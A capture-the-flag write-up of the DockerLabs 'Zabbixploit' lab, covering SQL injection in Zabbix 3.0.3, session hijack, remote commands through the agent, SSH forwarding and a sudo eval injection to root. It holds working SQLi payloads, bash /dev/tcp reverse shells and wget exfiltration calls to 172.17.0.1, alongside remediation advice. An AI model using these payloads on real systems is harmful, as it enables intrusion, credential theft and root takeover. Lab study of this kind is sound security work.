# Zabbixploit — DockerLabs Writeup

Lab id 293 · Medium · fourth and final lab of a five-lab pilot
Host `172.17.0.5` · container `zabbixploit_container` · image `zabbixploit:latest`

**Result: solved.** Flag recovered with a full `uid=0(root)` identity read in the same command, over the network, with no container-exec shortcut in the chain.

```
/ $ sudo /usr/local/sbin/zbx-svc-ctl.sh "zabbix_server; id; cat /root/flag.txt"
[*] Reiniciando servicio: zabbix_server; id; cat /root/flag.txt
zabbix_server: stopped
zabbix_server: started
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
Gracias por Jugar - IHATEFW . .
```

---

## 0. Autocorrection — four things I got wrong, and one of them nearly ended the engagement

This section is first because in this lab the corrections *were* the work. Three of the five labs in this series self-documented their own weaknesses; this one did too, but the documentation pointed at a mechanism that does not work (§7), so following it faithfully produces a dead end. The errors below are the ones that actually cost time.

### 0.1 The error-based extraction oracle silently truncated the secret, and I believed it

I extracted the administrator's session id with a classic XPATH-error oracle:

```
XPATH syntax error: '~03fb5847289a0bb44e80e56c2a0d633'
```

That is 31 hex characters. I used it as the session id, and the session hijack **did not work** — the frontend came back `You are logged in as "guest"`. My first conclusion was that the web session and the JSON-RPC API use separate session stores, or that Zabbix rotates the cookie server-side. Both conclusions were wrong, and I nearly built the rest of the chain on them.

The real cause: **the oracle is length-limited.** Asking for the value again with `LENGTH()` and `SUBSTRING()` gave:

```
XPATH syntax error: '~32'                              <- LENGTH(sessionid)
XPATH syntax error: '~03fb5847289a0bb44e80e56c'        <- SUBSTRING(sessionid,1,24)
XPATH syntax error: '~2a0d6338'                        <- SUBSTRING(sessionid,25)
```

24 + 8 = 32, and the tail `2a0d6338` supplies the final character the first request dropped. Reconstructed: `03fb5847289a0bb44e80e56c2a0d6338`.

The lesson is not "be careful". It is that **a truncated secret produces a plausible failure, not an error.** Every downstream symptom — a rejected cookie, an "invalid session" message — is indistinguishable from a wrong hypothesis about the application. The only defence is to ask the oracle for the *length* before trusting the value, and to re-extract the tail with `SUBSTRING` rather than re-running the same request. This is now an oracle in `sections/api_web.md`.

### 0.2 I concluded the API rejected my session, when the session was simply wrong

With the truncated id, the API returned:

```
{"jsonrpc":"2.0","error":{"code":-32602,"message":"Invalid params.","data":"Session terminated, re-login, please."}}
```

I read that as an API/web session-store incompatibility and nearly routed around the API. With the corrected id the same call returned both accounts:

```
{"jsonrpc":"2.0","result":[{"userid":"1","alias":"Admin"},{"userid":"2","alias":"guest"}],"id":1}
```

**A rejected credential and a broken interface look identical from the client.** Before filing "component X cannot authenticate against component Y", confirm the credential is the one you think it is.

### 0.3 I misread `drwxr-xr-x 1000:zabbix` as group-writable, twice

I picked the Zabbix web root as the exfiltration channel for my first RCE because the directory is owned by `1000:zabbix` and the agent runs in group `zabbix`. I then wrote a command that would drop a file there and asserted in my own reasoning that the group had write. `drwxr-xr-x` is `rwx r-x r-x` — the group has **no** write. I made the same mistake again on `conf/` in the next message. Only an actual `test -w` as the target user settled it:

```
WRITABLE: /tmp
WRITABLE: /var/lib/zabbix
WRITABLE: /var/log/zabbix
WRITABLE: /dev/shm
no:       /var/www
no:       /var/www/localhost/htdocs
no:       /usr/share/webapps/zabbix
no:       /usr/share/webapps/zabbix/conf
```

Ownership by *a* group in your favour is not write access. Assert permission from `test -w` run as the identity, never from the mode string.

### 0.4 I used the wrong constant and the wrong channel, and both looked like server bugs

Two more that cost a cycle each, recorded because the failure mode is the lesson:

- **`execute_on` is a location, not a boolean.** `0` means *run on the Zabbix server*, `1` means *on the agent*. I set `0` while believing I was selecting the agent.
- **`operationtype=4` is `GROUP_ADD`, not "remote command".** `OPERATION_TYPE_COMMAND` is `1`. The API replied `Operation has no group to operate.` — an error about a feature I never asked for, which is the signature of a mistyped constant rather than a missing field. Same shape as the `conditiontype=5` (`TRIGGER_VALUE`) and `formulaid` must-match-`/[A-Z]+/` surprises in the same API.
- **There is no Script importer in 3.0.3.** I spent a cycle building a Zabbix configuration XML to create a script through `conf.import.php`. `grep -rn "script" include/classes/import/importers/` returns nothing. Check that the feature exists in the interface's own code before designing a payload around it.

### 0.5 The correction that mattered most: the lab's own escalation helper is broken

The bootstrap states the intended path is CVE-2016-10134 → session hijack → `Administration → Scripts` → remote command. Two things in that chain do not exist or do not work:

1. **`scripts.php` has no route.** The controllers `CControllerScriptList` / `CControllerScriptEdit` are present in `app/controllers/`, but no file in the document root `require`s them. The Scripts UI is unreachable. (`scripts_exec.php` does exist and is the lab's replacement.)
2. **`scripts_exec.php` cannot dispatch anything.** It builds a shadow trigger whose expression is `'{'.$functionid.'}>0'`. In Zabbix a trigger expression `{N}` is an **item id**, not a function id. Item 900007 does not exist, so the trigger can never reach PROBLEM, the escalator leaves the escalation pending, and the helper's own 30-second cleanup deletes the trigger and the escalation dies with it. The target's log says exactly that:

```
392:20260927:221535.984 escalation cancelled: trigger id:900007 deleted.
392:20260927:221553.994 escalation cancelled: trigger id:900008 deleted.
```

The page reports `Command sent for execution.` and no command is ever sent. **A UI that reports success for an action it did not perform is a finding about the target, and per `decision-making.md` §7 the author's own comments mark intent, not reachability** — here the intent is documented at length and the mechanism behind it is dead.

I therefore built the action/trigger chain myself through the API, which is the same primitive the lab meant to expose, reached a different way. That is reported in full below, including the parts where my own wiring was wrong first.

---

## 1. Target and stack

**The name lied, and it lied in both directions.** "Zabbixploit" suggests a Zabbix-specific web CVE, and the container does ship a Zabbix 3.0.3 web frontend — but the *entry* is not the interesting part, and the *escalation* is not web at all. Reading the stack before assuming saved the run: this is a full Zabbix server + agent + web triple, not a web app that happens to mention Zabbix.

```
PORT      STATE SERVICE             VERSION
22/tcp    open  ssh                 OpenSSH 8.4 (protocol 2.0)
80/tcp    open  http                Apache httpd 2.4.33 ((Unix))
3306/tcp  open  mysql               MariaDB 10.3.23 or earlier (unauthorized)
10050/tcp open  tcpwrapped
10051/tcp open  ssl/zabbix-trapper?
```

```
Alpine Linux 3.4.6      (container; host kernel 7.0.0-34-generic Ubuntu)
Zabbix 3.0.3 (revision 60173)   server + agent + web frontend
Apache httpd 2.4.33 (Unix)     PHP/5.6.36
MariaDB 10.3.23
OpenSSH 8.4
```

Every component is end-of-life: Zabbix 3.0.3, PHP 5.6, Apache 2.4.33, Alpine 3.4.6. That is the root cause of Findings 1 and 2 and it is a decision, not a bug.

The document root is **not** `/var/www/localhost/htdocs` (which holds only a default `index.html`); `/etc/apache2/conf.d/apache.conf:2` overrides it to `/usr/share/webapps/zabbix/`. Confirmed by the login page served at `/` carrying `Set-Cookie: zbx_sessionid=…`.

Local accounts, from `/etc/passwd`: `zabbix` (102, shell `/bin/false`), `operador` (1001), `supervisor` (1002), plus `mysql` and `apache`. Four identities, four hops.

### The real surface

| Port | Service | Who talks to it | Reachable anonymously |
|---|---|---|---|
| 80 | Zabbix web 3.0.3 | operator | yes — `guest` has an empty password |
| 10050 | Zabbix agent | the Zabbix server | **no** — allowlisted to `127.0.0.1` |
| 10051 | Zabbix trapper | agents / senders | yes, but the API gate applies |
| 3306 | MariaDB | the web app and the server | yes, `zabbix`/`zabbix` |
| 22 | OpenSSH | operator | yes, password auth |

**10050 is `tcpwrapped`, not open-and-useful, and the difference is the whole first-hour decision.** `nmap` shows it accepting; the agent then refuses on source address. From inside the container my fake Zabbix server got a real protocol reply:

```
[+] connected to 127.0.0.1:10050
[+] sending passive-checks frame (123 bytes)
[<-] reply (41 bytes): 'ZBX_NOTSUPPORTED\x00Invalid item key format.'
```

From the network, the same request returned nothing at all. The target's own log names the control:

```
161:20260927:220654.786 failed to accept an incoming connection: connection from "172.17.0.1" rejected, allowed hosts: "127.0.0.1"
```

`Server=127.0.0.1` in `zabbix_agentd.conf:90`. So the classic "impersonate the Zabbix server to the agent and get `system.run[]` executed" attack — the thing the lab's name advertises — **does not work here, and the reason is a control that is correctly configured.** That is Finding 5, and it is a finding in the defender's favour that I am reporting because I spent real time on it and a reader would otherwise repeat the attempt.

---

## 2. Finding 1 — SQL injection in `latest.php` (`toggle_ids[]`), unauthenticated as `guest` → full database read

**Category:** CWE-89 SQL Injection. **Also:** CWE-200 (the `sessions` table is readable by a low-privilege account). **Auth required:** none — the `guest` account authenticates with an empty password.

### Root cause, read from source

`latest.php` declares a `P_ACT` block that takes a request array and hands each element to the profile store:

```php
// latest.php:74-93
if (hasRequest('favobj')) {
    if ($_REQUEST['favobj'] == 'toggle') {
        if (is_array($_REQUEST['toggle_ids'])) {
            foreach ($_REQUEST['toggle_ids'] as $k => $v) {
                if ($v[1] == '_') {
                    $hostId = substr($v, 2);
                    CProfile::update('web.latest.toggle_other', $_REQUEST['toggle_open_state'], PROFILE_TYPE_INT, $hostId);
                }
                else {
                    CProfile::update('web.latest.toggle', $_REQUEST['toggle_open_state'], PROFILE_TYPE_INT, $v);
                }
            }
        }
```

`$v` is a raw request string. It lands in the fourth argument of `CProfile::update()`, which is documented as an integer and is then concatenated **unescaped** into an `INSERT`:

```php
// include/classes/user/CProfile.php:209
public static function update($idx, $value, $type, $idx2 = 0) {

// include/classes/user/CProfile.php:277-290
private static function insertDB($idx, $value, $type, $idx2) {
    $values = [
        'profileid' => get_dbid('profiles', 'profileid'),
        'userid'    => self::$userDetails['userid'],
        'idx'       => zbx_dbstr($idx),
        $value_type => zbx_dbstr($value),
        'type'      => $type,
        'idx2'      => $idx2          // <-- raw
    ];
    return DBexecute('INSERT INTO profiles ('.implode(', ', array_keys($values)).') VALUES ('.implode(', ', $values).')');
}
```

Five of six values are escaped or generated. `idx2` is the sixth, and it is raw. `CProfile::update()` does validate its *third* argument (`checkValueType($value, $type)` at `:213`) and never its fourth. PHP has no runtime type enforcement, so `@param int $idx2` is documentation, not a control.

The `C20ImportConverter`/`CImportDataAdapter` route is not involved; this is the synchronous `CProfile::flush() → insertDB()` path. Zabbix's own `DBexecute()` is `mysqli_query` (`include/db.inc.php`) — single statement, no stacked queries — which is why the extraction below has to be error- or boolean-based rather than a second `INSERT`.

### Evidence — the sink fires, with a control

Anonymous login is `guest` with an **empty password** (`d41d8cd98f00b204e9800998ecf8427e` is `md5("")`), which the bootstrap deliberately re-enabled. `P_ACT` also requires the per-session CSRF token, which is not a barrier — it is handed to any logged-in user.

Benign control first, to prove the array reaches the database:

```
GET /latest.php?output=ajax&sid=<csrf>&favobj=toggle&toggle_open_state=1&toggle_ids[]=15385
→ HTTP 200, empty body

SELECT * FROM profiles WHERE idx LIKE '%toggle%';
profileid  userid  idx                 idx2   value_int  type
1          2       web.latest.toggle   15385  1          2
```

A row appeared under `userid=2` (`guest`). The request parameter is writing to the database.

Error-based extraction, one request per value. `toggle_ids[]` is the last column of the `VALUES` tuple, so I close the tuple and open a second one whose value is the subquery I want reflected:

```
toggle_ids[]=15385); (0,0,'x','x',0,EXTRACTVALUE(1,CONCAT(0x7e,(SELECT sessionid FROM sessions WHERE userid=1 LIMIT 1))))#
```

The application renders the database's error text straight into the response body — which also means **the full statement is echoed**, a free oracle in itself:

```html
<div class="msg-bad"><div class="msg-details"><ul><li>Error in query [INSERT INTO profiles (profileid, userid, idx, value_int, type, idx2) VALUES (2, 2, 'web.latest.toggle', '1', 2, 15385), (0,0,'x','x',0,EXTRACTVALUE(1,CONCAT(0x7e,(SELECT sessionid FROM sessions WHERE userid=1 LIMIT 1))))#)] [XPATH syntax error: '~03fb5847289a0bb44e80e56c2a0d633']</li></ul></div>
```

Because the full SQL is reflected, a single request also yields arbitrary read: swap the tuple for a scalar subquery anywhere in the statement and the reflected text carries it.

**Impact.** Unauthenticated-adjacent (one empty-password login) full read of the Zabbix database, including the `users` table with password hashes, the `sessions` table with live session ids, and `scripts` with stored commands. The DB account behind the web app holds `ALL PRIVILEGES ON zabbix.*`, so this is read *and* write for every table in the schema. It is the entry for Findings 2, 3 and 4.

**Remediation.** Upgrade — this is CVE-2016-10134, fixed in 2.2.14 and 3.0.4. The `idx2` parameter must be coerced with `zbx_ctype_digit()` (or `intval`) at `latest.php:82`/`latest.php:88`, and `CProfile::update()` must reject a non-integer `$idx2` instead of trusting the docblock. Independently: the `guest` account must not exist with an empty password, and the web application's database account must not hold `ALL PRIVILEGES` on its schema.

---

## 3. Finding 2 — Plaintext session table: hijacking the CSRF token is account takeover — CWE-384 / CWE-522

**Category:** CWE-384 Session Fixation / CWE-522 Insufficiently Protected Credentials. **Prerequisite:** Finding 1.

Zabbix stores the session id verbatim. There is no server-side secret, no binding to user agent or source address, and no rotation. An `INSERT` into `sessions` is indistinguishable from a real login — the bootstrap says so, and it is true:

> "El propio Zabbix, al hacer login, únicamente inserta una fila en `sessions` (sessionid, userid, lastaccess, status) — no hay más estado server-side que validar"

So the value read in Finding 1 is a complete authentication token. Setting it as the cookie authenticates as `userid 1`, `type 3` (Super Admin).

### Evidence — and a hijack proof that does not depend on reading the UI

The naive check ("does the dashboard look different?") is weak, because a rejected session still renders a page. Zabbix derives its CSRF token from the session id, which gives an **offline-verifiable proof**: the token the server hands me must be `substr(sessionid, 8, 16)` of the id I injected.

```
GET /index.php            Cookie: zbx_sessionid=<guest session>
  → <input name="sid" value="a95a8bb4bc7ac3c2">     substr("52ee027590fd705aa95a8bb4bc7ac3c2", 8, 16) ✓ guest

GET /zabbix.php?action=dashboard.view   Cookie: zbx_sessionid=03fb5847289a0bb44e80e56c2a0d6338
  → <input name="sid" value="4e80e56c2a0d6338">     substr("03fb5847289a0bb44e80e56c2a0d6338", 8, 16) ✓ ADMIN
```

Two different predictions, two different matches. The injected id is being used, and the session is `Admin`.

Privilege confirmation, from the navigation the server renders:

```
Monitoring  Inventory  Reports  Configuration  Administration
```

`guest` sees only a dashboard. The full Administration tree is a Super Admin's.

**The stolen session is not interface-scoped.** The same id authenticates the JSON-RPC API, which is a second, scriptable control plane over the same authority:

```
POST /api_jsonrpc.php  {"jsonrpc":"2.0","method":"user.get","params":{"output":["userid","alias","role"]},"auth":"03fb…38","id":1}
{"jsonrpc":"2.0","result":[{"userid":"1","alias":"Admin"},{"userid":"2","alias":"guest"}],"id":1}
```

and the unauthenticated baseline for the same endpoint, for contrast:

```
POST /api_jsonrpc.php  {"jsonrpc":"2.0","method":"apiinfo.version","params":{},"id":1}
{"jsonrpc":"2.0","result":"3.0.3","id":1}
```

From here the API is a fully scriptable Super Admin: `script.create`, `trigger.create`, `action.create`, `item.create`, and reads over every table. That is what Finding 3 uses.

**Impact.** Any read of the `sessions` table is full administrative takeover of the monitoring platform — and the monitoring platform holds every credential its monitored infrastructure reports, so this is a pivot into the estate, not just a dashboard.

**Remediation.** Store a hash of the session id, not the id (this is the standard fix for exactly this class). Bind the session to a client fingerprint and rotate the id on privilege change. Disable the `guest` account by default. Expire and clean `sessions` aggressively — the seeded row had `autologout = 0`, i.e. no expiry.

---

## 4. Finding 3 — `EnableRemoteCommands=1` turns a Super Admin session into command execution as the agent account

**Category:** CWE-78 OS Command Injection (chained with CWE-269 / CWE-250). **This is the finding that produces the shell.**

The root cause is a one-line configuration change the lab's own entrypoint makes and annotates:

```bash
# /entrypoint.sh
# Misconfiguración intencional para el laboratorio: habilita la ejecución de
# comandos remotos en el agente (deshabilitado por defecto en Zabbix real).
sed -i '/^#\? *EnableRemoteCommands=/d' /etc/zabbix/zabbix_agentd.conf
echo "EnableRemoteCommands=1" >> /etc/zabbix/zabbix_agentd.conf
```

```
$ grep -nE 'EnableRemoteCommands' /etc/zabbix/zabbix_agentd.conf
388:EnableRemoteCommands=1
```

This is the documented design of Zabbix: an action operation of type "Remote command" makes the **server** hand a command string to the **agent**, which executes it as its own service account. With a Super Admin session from Finding 2, that is arbitrary command execution. `EnableRemoteCommands` is `0` in a stock install for exactly this reason.

### The telemetry lie — `status = SENT` is not execution

Worth stating plainly, because it cost me several cycles and it will mislead anyone automating this: **the alert row records that the command was dispatched, not that it ran.** Six different commands produced:

```
alertid  actionid  status  error  retries  message
26       13        1       (empty) 0       Zabbix server:id 2>&1 | nc 172.17.0.1 45124
25       13        1       (empty) 0       Zabbix server:id 2>&1 | nc 172.17.0.1 45124
24       12        1       (empty) 0       Zabbix server:bash -c 'exec bash -i >& /dev/tcp/172.17.0.1/45123 0>&1'
…
```

`status = 1` is `ALERT_STATUS_SENT` (`include/defines.inc.php:471`), not "done". An empty `error` column means the agent accepted the request. **The only evidence of execution is an observable side effect I chose in advance.** When the exfil I designed produced nothing, the correct reading was "my hypothesis about the dispatch is wrong", not "the target refused".

### Evidence — the dispatch, and then execution

`scripts_exec.php` — the lab's own helper — always reports success and never dispatches (§0.5), so I built the action through the API. Zabbix 3.0 API shapes that cost me a cycle each, recorded because they are the actual difficulty of this class:

- trigger expressions use the **3.0** `{HOST:KEY.FUNCTION()}` syntax, not 4.0's `{host/key}`: `{Zabbix server:agent.ping.last(0)}>0`
- `OPERATION_TYPE_COMMAND` is `1`, not `4` (`4` is `GROUP_ADD`)
- `CONDITION_TYPE_TRIGGER_VALUE` is `5`; `formulaid` must match `/[A-Z]+/`, so `"A"`
- `opcommand_hst` (the target host) is a sibling of `opcommand`, not a child
- `esc_period` has a 60-second minimum

```json
{"jsonrpc":"2.0","method":"action.create","params":{
  "name":"pwn-wget","eventsource":0,"status":0,"esc_period":60,
  "filter":{"evaltype":0,"conditions":[
     {"conditiontype":5,"operator":0,"value":"1","formulaid":"A"}]},
  "operations":[{"operationtype":1,
     "opcommand":{"type":4,"scriptid":"13","execute_on":0},
     "opcommand_hst":[{"hostid":10084}]}],
  "recovery":{}},"auth":"03fb…38","id":110}
{"jsonrpc":"2.0","result":{"actionids":[16]},"id":110}
```

`agent.ping` on the real host `10084` is `1`, so the trigger is permanently in PROBLEM and any new problem event matches the condition. Then a fresh trigger to generate that event.

**The execution proof is the process table, not the alert row.** Immediately after dispatch:

```
1638 zabbix  sh -c bash -c 'exec bash -i >& /dev/tcp/172.17.0.1/45123 0>&1'
1639 zabbix  bash -i
1777 zabbix  sh -c bash -c 'exec bash -i >& /dev/tcp/172.17.0.1/45123 0>&1'
1778 zabbix  bash -i
```

My injected string, running as `zabbix`. That is the finding: arbitrary command execution as the agent account, with the payload under my control and no shell of my own.

**Exfiltration, over the network.** The agent account can write `/tmp`, `/var/lib/zabbix`, `/var/log/zabbix` and `/dev/shm` and nothing under the document root (§0.3), so there is no file-based channel. I ran a logging HTTP listener and had the command call back:

```
script command: wget -q -O /dev/null http://172.17.0.1:8123/IDU=$(id -u)_IDG=$(id -g)_WHOAMI=$(whoami) 2>&1
script command: wget -q -O /dev/null http://172.17.0.1:8123/SECRET=$(cat /var/lib/zabbix/enc/.agent_healthcheck_secret) 2>&1
```

```
REQ /IDU=102_IDG=1000_WHOAMI=zabbix
REQ /SECRET=Qz7mVr2KpT9x
```

**Identity, measured not assumed:** `uid=102(zabbix) gid=1000(zabbix)`. Not root. The chain needs three more hops, and the web application is *not* running as root — Apache is `apache` (101) and the Zabbix server and agent are `zabbix` (102). Unlike the second lab in this series, where a `user = root` pool config collapsed the chain to a single step, **no privilege boundary here was weaker than expected.** I hypothesised four hops and took four.

**Control test — the identity is the boundary.** The same read that returns `uid=102` from the agent returns nothing for an unprivileged local account:

```
operador: cat /var/lib/zabbix/enc/.agent_healthcheck_secret   → (unreadable; mode 0600 zabbix:zabbix)
zabbix:   cat /var/lib/zabbix/enc/.agent_healthcheck_secret   → Qz7mVr2KpT9x
```

**Impact.** Full compromise of the monitoring tier and of the agent host, from a single web session. On a real deployment the agent is by definition installed on every monitored host, so "the agent account" is a credential that exists on the entire estate, and the server that can command it is the one that holds all the alerting rules.

**Remediation.** `EnableRemoteCommands=0` unless a documented requirement demands it (Zabbix's default, and the lab's own comment says as much). Do not let the monitoring role be a web-reachable Super Admin role — separate a read-only monitoring user from configuration. Restrict the JSON-RPC API to loopback or a management network, and require a real authentication token rather than a reusable session id. Upgrade off 3.0.3.

---

## 5. The chain

Four identities, four hops, all over the network.

| # | From → To | Primitive | Evidence |
|---|---|---|---|
| 1 | anonymous → `guest` → `Admin` | CWE-89 in `latest.php` reads `sessions.sessionid`; the id is the credential | `XPATH syntax error: '~03fb5847289a0bb44e80e56c2a0d6338'`; CSRF `4e80e56c2a0d6338` = `substr(id,8,16)` |
| 2 | `Admin` (web/API) → `zabbix` | CWE-78 + `EnableRemoteCommands=1`: action remote command executed by the agent | PIDs 1638/1639 as `zabbix`; `REQ /IDU=102_IDG=1000_WHOAMI=zabbix` |
| 3 | `zabbix` → `operador` | agent reads the mode-0600 secret the stored maintenance script points at, and the SSH password in it | `REQ /SECRET=Qz7mVr2KpT9x` → `uid=1001(operador)` over SSH |
| 4 | `operador` → `supervisor` | the maintenance console binds `127.0.0.1:9001` and is unreachable; an SSH `direct-tcpid` forward reaches it, the token is in a group-readable file, and the token console `dup2`s the socket onto a shell's stdio | `token valido. shell de mantenimiento:` → `uid=1002(supervisor)` |
| 5 | `supervisor` → `root` | CWE-78 in a `NOPASSWD` sudo script: `zbx-svc-ctl.sh` `eval`s `$1` | `sudo /usr/local/sbin/zbx-svc-ctl.sh "zabbix_server; id; cat /root/flag.txt"` → `uid=0(root)` + flag |

### Why this order, and not another

- **The web frontend is not the first hop into the operating system.** It is the first hop into the *monitoring role*, and the escalation to a Linux account happens through the agent's command execution. Reading the source told me this before I tried anything: `EnableRemoteCommands` is set, so the moment a Super Admin session exists, the interesting primitive is a Zabbix *action*, not a Zabbix *request*.
- **The `scripts` table is a map, not a payload.** The lab deliberately kept the operator password *out* of the stored command, so reading the table tells you the path `/var/lib/zabbix/enc/.agent_healthcheck_secret` and nothing more. The password is only reachable by already being `zabbix`. That is why hop 2 must precede hop 3 — and it is the correct design: the disclosure that looks like the answer is actually a pointer to a file that needs a privilege you do not have yet.
- **Hop 4 needs no exploit.** The console is bound to loopback and its token sits in a file `operador` can read by group. The only reason it is not trivially reachable is the bind address, and SSH port-forwarding is a standard feature, not a vulnerability. The interesting part is what the token console *is*: a service that accepts a bearer token and hands the caller a shell, having `dup2`'d the accepted socket onto stdin/stdout/stderr of an interactive `/bin/sh`. The shell's stdin **is** the network socket — the "bash TCP socket via file descriptor" the lab's own note gestures at. No `pty` is allocated, so `bash -i` prints `can't access tty; job control turned off` and still works.

### Control test on the final step

The escalation is the `eval`, not sudo's generality:

```
supervisor@…:~$ sudo -n -l
User supervisor may run the following commands on …:
    (root) NOPASSWD: /usr/local/sbin/zbx-svc-ctl.sh
```

That is a *narrow* rule — one script, not `ALL`. It is still root, because the script itself is injectable:

```bash
#!/bin/bash
# /usr/local/sbin/zbx-svc-ctl.sh
SERVICE="$1"
...
eval "supervisorctl -c /etc/supervisord.conf restart $SERVICE"
```

`sudo` passes the argument through unmodified, so `sudo …/zbx-svc-ctl.sh "zabbix_server; id; cat /root/flag.txt"` reaches `eval` as one string. **A `NOPASSWD` rule is only as narrow as the argument handling of the script it names** — quoting the argument in the caller does not help, because the injection is in the callee.

---

## 6. Independent findings — not used by the chain, reported anyway

Reported because fixing only the chain steps leaves these live, and because two of them are the kind a reader would assume I had used.

### 6.1 The Scripts UI has no route and its replacement silently no-ops — CWE-306 (latent) / broken control

`CControllerScriptList` and `CControllerScriptEdit` exist in `app/controllers/`, but **no file in the document root requires them** — there is no `scripts.php`. The intended Super Admin surface does not exist. Its replacement, `scripts_exec.php`, builds a shadow trigger with a **function id where Zabbix requires an item id** (`'{'.$functionid.'}>0'`), so the trigger can never reach PROBLEM, the escalation sits pending, and the helper's own 30-second cleanup cancels it:

```
392:20260927:221535.984 escalation cancelled: trigger id:900007 deleted.
```

The response says `Command sent for execution.` Fix: restore the route, and validate the trigger expression. **The reporting lesson is the general one: a status message asserting success is not evidence of the action, in a control or in an exploit** — see §4.

### 6.2 `scripts` is visible to every Super Admin with no group ACL — CWE-862 / CWE-200

Even with the route restored, `Administration → Scripts` is gated by a fixed Super Admin check and filtered by neither `groupid` nor `usrgrp`, so any Super Admin session reads every stored command on every host. Here the lab mitigates it well (the password is not in the command), but the class is real: stored commands routinely embed credentials, `{HOST.CONN}` expansions, and internal addresses. Fix: scope script visibility by host group.

### 6.3 The agent's `Server=127.0.0.1` allowlist — CWE-732, informational, **a control that worked**

`zabbix_agentd.conf:90` restricts agent requests to loopback, and the agent says so on every rejection:

```
failed to accept an incoming connection: connection from "172.17.0.1" rejected, allowed hosts: "127.0.0.1"
```

This is what blocks the standard "impersonate the Zabbix server, receive `system.run[]`" attack, and it held against a correctly framed protocol message. **I am reporting it because I attacked it and it stopped me, and because the agent is exposed on `0.0.0.0:10050` — a future `Server=` entry, a NAT rule, or a container-network change turns a working control into unauthenticated RCE on every monitored host.** Keep `Server=`/`ServerActive=` loopback-only; if a remote server must poll, use PSK-encrypted communication (`TLSConnect`/`TLSAccept`), which is off by default here.

### 6.4 Script items execute on the Zabbix server as `zabbix` — CWE-78, a second RCE primitive I did not use

Independent of remote commands, a Zabbix **Script item** (type 10) runs `/usr/share/zabbix/externalscripts/<key>` on the *server*, as the server's account. I created one and the server executed it:

```
388:20260927:221808.843 item "Zabbix server:pwn.exec[1]" became not supported:
      /usr/share/zabbix/externalscripts/pwn.exec: [2] No such file or directory
```

It failed only because the payload file did not exist — the primitive is real and needs no agent, no trigger, and no escalator. It is the *better* exfiltration channel in this lab and I did not use it, because the directory is absent and the server account cannot create it. Report it: any Super Admin session here has at least two independent command-execution paths, and closing `EnableRemoteCommands` alone leaves this one open.

### 6.5 MariaDB on `0.0.0.0:3306` with `zabbix`/`zabbix` and `ALL PRIVILEGES` on the schema — CWE-1392 / CWE-250

```
3306/tcp open mysql MariaDB 10.3.23 or earlier (unauthorized)
GRANT ALL PRIVILEGES ON zabbix.* TO 'zabbix'@'localhost';
```

Not used by the chain — the credential came from the agent-side secret in §5. Exposed on all interfaces with a stock account name and password as the password, this is a full database compromise for anyone who can reach the port: `users` (hashes), `sessions` (live tokens), `scripts`, `actions`. The `zabbix` account has no global `FILE` privilege, so `LOAD_FILE`/`INTO OUTFILE` are unavailable — I checked, and it is the one limit worth noting. Fix: bind to loopback, require a non-default credential, and grant per-table rather than schema-wide privileges.

### 6.6 `guest` enabled with an empty password — CWE-258 / CWE-287

```
passwd: d41d8cd98f00b204e9800998ecf8427e      ( = md5("") )
UPDATE usrgrp SET users_status=0 WHERE name='Guests';
```

The bootstrap explicitly re-enables it. This is the step that turns Finding 1 from "authenticated SQL injection" into "one HTTP request away from anonymous", and it is a decision, not a defect. Fix: delete `guest`, or give it a random unusable password and no group membership. Note the password storage itself is **unsalted MD5** (`CUser.php:1055` — `md5($user['password'])`, compared at `CUser.php:1013`); I confirmed the scheme by cracking the seeded Admin hash offline against 750 601 candidate passwords across three wordlists with no match, so the password is strong even though the hashing is not.

### 6.7 `PasswordAuthentication yes` — CWE-1392

```
PermitRootLogin no
PasswordAuthentication yes
UsePAM no
PrintMotd no
```

`PermitRootLogin no` is correctly set, and there is **no pre-auth banner leak here** — the opposite of the second lab in this series, where `Banner /etc/issue.net` handed over a live credential. `PrintMotd no` is also deliberate. Password auth is still enabled, and the operator password lives in a mode-0600 file read by the agent, so it is not image-baked — better hygiene than lab 3. Fix: keys only.

### 6.8 Four note files world-readable, three of them a roadmap — CWE-732 / CWE-538

`/home/nota1.txt` is mode `0644` and world-readable; `/home/operador/nota3.txt` is `-r--r-----` and readable by any member of group `operador`; `/home/zabbix/.nota2.txt` and `/home/supervisor/nota4.txt` are correctly scoped to their owners. `nota1` states the tty is short-lived and that the NAT drops idle connections — accurate operational detail about the defence in depth, in a file any anonymous local user can read. `nota2` hands an unauthenticated reader working database credentials (`mysql -uzabbix -pzabbix`) and points at the `scripts` table. Fix: no operational detail in world-readable paths; inject hints at runtime in a lab, or drop them.

### 6.9 Four EOL components — CWE-1104, the root cause of Findings 1 and 2

Zabbix 3.0.3, PHP 5.6.36, Apache 2.4.33, Alpine 3.4.6. Zabbix 3.0.3 is two majors and a decade behind; PHP 5.6 has been unsupported since 2019. Per `decision-making.md` §4, CVE-2016-10134 is the *mechanism*; shipping an unmaintained monitoring stack to the internet is the *decision*. Fix: upgrade the whole tier, and report it as the decision so the next upgrade does not reintroduce the CVE on a supported-but-unpatched build.

### 6.10 A stock script ships `sudo` — CWE-250, informational

```
3  Detect operating system   sudo /usr/bin/nmap -O {HOST.CONN} 2>&1
```

A stock Zabbix script definition invokes `sudo` with `nmap` as a *root* Nmap, which enables SYN scanning and version detection against any host a Super Admin can add. It did not factor into the chain. Fix: drop `sudo` (Nmap's privileged raw sockets are the only reason it is there) and use unprivileged scanning or a fixed capability set.

---

## 7. Design of the lab

**The name is narrative, not evidence** — the second time in four labs, and the pattern is now worth stating as a rule: *a lab name is a genre, not a finding.* "PipePwned" suggested Windows named pipes; it was an Ubuntu Flask CI/CD app. "Zabbixploit" suggests a Zabbix web CVE — and there genuinely is one, CVE-2016-10134, so the name is accurate about the entry. It is misleading about everything after it: the escalation is not a Zabbix feature, it is `bash` `eval` in a sudo script, and the last two hops are a file mode and a loopback bind.

**This lab self-documents, and that makes it the fourth confirmation.** The entrypoint names `EnableRemoteCommands=1` as the intentional misconfiguration and says it is "disabled by default in real Zabbix"; the bootstrap names CVE-2016-10134 and explains that it replaced the Admin password specifically to stop players short-cutting it via the stock `zabbix`/`zabbix`; `nota2`–`nota4` walk through the remaining hops, including the file-descriptor hint. Per `decision-making.md` §7 this is a real cost: the derivation that produced the most transferable insight here — *the SQLi's sixth column is unescaped because its docblock says `@param int`, and PHP does not enforce that* — cost me one grep of `CProfile::insertDB()`, and it was preceded by twenty minutes of reading the author's prose about the CVE. A lab that hands you the answer and a lab that makes you find it produce the same green checkmark. **The design requirement stands: hide the annotation, keep the trigger.**

